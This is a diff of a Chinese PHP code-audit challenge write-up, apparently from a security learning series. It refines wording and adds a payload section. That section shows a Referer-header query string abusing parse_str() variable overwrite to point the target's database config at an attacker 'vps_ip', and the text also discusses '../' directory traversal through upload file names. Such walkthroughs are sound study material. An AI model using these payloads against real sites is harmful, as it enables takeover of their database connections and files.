@@ -42,7 +42,7 @@ move_uploaded_file ( string $filename , string $destination ) : bool
 
 这是文件上传中常用的一个函数，文件被上传结束后，默认地被存储在了临时目录中，这时必须将它从临时目录中移动到其它地方，因为脚本执行完后，临时目录里的文件会被删除。所以要在删除之前用 PHP 的 `copy()` 或者 `move_upload_file()`  函数将它复制或者移动到其它位置，到此，才算完成了上传文件过程。
 
-再观察里面的两个参数，如果 `file[‘name’]` 是可控的话，或许可以通过加 `../` 进行目录穿越。
+再观察里面的两个参数，如果 `file['name']` 是可控的话，或许可以通过加 `../` 进行目录穿越。
 
 追溯一下源头，在构造函数中可看到，`this->file` 来自  `$_FILES['solution']` 。
 
@@ -86,7 +86,7 @@ Array (
 
 结合上面的代码，`this->file` 是中间的那个数组，`name` 是可控的，即我们上传文件本身的名称。
 
-外面还有一个 `if` 判断
+外面还有一个 `if` 判断：
 
 ```php
 in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool
@@ -341,11 +341,21 @@ $currentUser = getUser($id);
 echo '<h1>'.htmlspecialchars($currentUser).'</h1>';
 ```
 
-`$_SERVER['HTTP_REFERER']` 是可控的，改下 `Referer` 头即可
+`parse_str()` 极其容易导致变量覆盖漏洞，
 
-`parse_str()` 极其容易导致变量覆盖漏洞。
+另外`$_SERVER['HTTP_REFERER']` 是可控的，改下 `Referer` 头即可。
 
 > 要获取当前的 *QUERY_STRING*，可以使用 [$_SERVER['QUERY_STRING'\]](https://php.net/manual/zh/reserved.variables.server.php) 变量。 
+
+注意到第二行 `global $config, $db`，可以覆盖掉它，从而接入我们的数据库。
+
+### payload
+
+修改 `Referer` 头
+
+```
+http://host/?config[dbhost]=vps_ip&config[dbuser]=root&config[dbpass]=root&config[dbname]=attack&id=1
+```
 
 
 
@@ -1413,10 +1423,10 @@ if(isset($_GET["u"]) && isset($_GET["p"])) {
 
 ## 24 - Nutcracker
 ```php
-@$GLOBALS=$GLOBALS{next}=next($GLOBALS{'GLOBALS'})
-    [$GLOBALS['next']['next']=next($GLOBALS)['GLOBALS']]
-    [$next['GLOBALS']=next($GLOBALS[GLOBALS]['GLOBALS'])
-     [$next['next']]][$next['GLOBALS']=next($next['GLOBALS'])]
-    [$GLOBALS[next]['next']($GLOBALS['next']{'GLOBALS'})]=
-    next(neXt(${'next'}['next']));
+@$GLOBALS = $GLOBALS{next} 
+= next($GLOBALS{'GLOBALS'})[$GLOBALS['next']['next'] 
+= next($GLOBALS)['GLOBALS']][$next['GLOBALS'] 
+= next($GLOBALS[GLOBALS]['GLOBALS'])[$next['next']]][$next['GLOBALS'] 
+= next($next['GLOBALS'])][$GLOBALS[next]['next']($GLOBALS['next']{'GLOBALS'})] 
+= next(neXt(${'next'}['next']));
 ```
